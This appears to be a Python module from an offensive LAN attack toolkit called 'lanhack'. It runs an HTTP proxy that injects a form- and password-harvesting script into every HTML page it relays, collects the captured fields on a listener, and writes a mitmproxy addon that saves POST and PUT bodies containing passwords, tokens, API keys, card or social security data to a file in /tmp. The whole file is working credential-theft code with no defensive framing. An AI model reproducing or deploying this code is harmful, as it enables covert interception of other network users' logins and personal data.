import os, threading, stat
import http.server as hs
import urllib.request

from lanhack import config

HARVEST_JS = b"""
<script>
document.addEventListener('submit',function(e){
  var f=e.target;
  var d={};
  for(var i=0;i<f.elements.length;i++){
    var el=f.elements[i];
    if(el.name||el.id)d[el.name||el.id]=el.value;
  }
  var q=Object.keys(d).map(function(k){return k+'='+encodeURIComponent(d[k])}).join('&');
  new Image().src='http://'+window.location.hostname+':9999/?'+q;
});
document.querySelectorAll('input[type=password]').forEach(function(el){
  el.addEventListener('change',function(){
    new Image().src='http://'+window.location.hostname+':9999/pw?'+encodeURIComponent(this.name||'pw')+'='+encodeURIComponent(this.value);
  });
});
</script>
</head>"""

def harvester_proxy():
    class H(hs.BaseHTTPRequestHandler):
        def do_GET(self):
            try:
                url = self.path
                if url.startswith("/?"):
                    config.harvested_creds.append(("GET", url[2:], __import__('datetime').datetime.now().strftime("%H:%M:%S")))
                    self.send_response(200)
                    self.end_headers()
                    return
                if url.startswith("/pw?"):
                    config.harvested_creds.append(("PWD", url[4:], __import__('datetime').datetime.now().strftime("%H:%M:%S")))
                    self.send_response(200)
                    self.end_headers()
                    return
                req = urllib.request.Request("http://" + self.headers["Host"] + url)
                resp = urllib.request.urlopen(req, timeout=5)
                data = resp.read()
                ct = resp.headers.get("Content-Type", "")
                if "text/html" in ct and b"</head>" in data:
                    data = data.replace(b"</head>", HARVEST_JS)
                self.send_response(resp.status)
                for k, v in resp.headers.items():
                    if k.lower() not in ("transfer-encoding", "content-length"):
                        self.send_header(k, v)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            except: self.send_response(502); self.end_headers()
        do_POST = do_GET
        def log_message(self, *a): pass
    s = hs.HTTPServer(("0.0.0.0", 8082), H)
    while not config.quit_flag and config.harvester_on:
        s.timeout = 1
        s.handle_request()
    s.server_close()

MITM_ADDON = config.MITM_ADDON

def _init_cred_file(path):
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, stat.S_IRUSR | stat.S_IWUSR)
    os.close(fd)

def _ensure_mitm_addon():
    code = '''import re
from mitmproxy import http
CRED_PATTERNS = [b"password", b"passwd", b"login", b"username", b"email", b"token", b"secret", b"api_key", b"credit", b"ssn"]
def request(flow: http.HTTPFlow):
    if flow.request.method == "POST" or flow.request.method == "PUT":
        body = flow.request.get_text() or ""
        for pat in CRED_PATTERNS:
            if pat in body.lower().encode():
                with open("/tmp/lanhack_creds.txt", "a") as f:
                    f.write(f"[{flow.request.pretty_host}] {body}\\n")
                break
'''
    with open(MITM_ADDON, "w") as f:
        f.write(code)
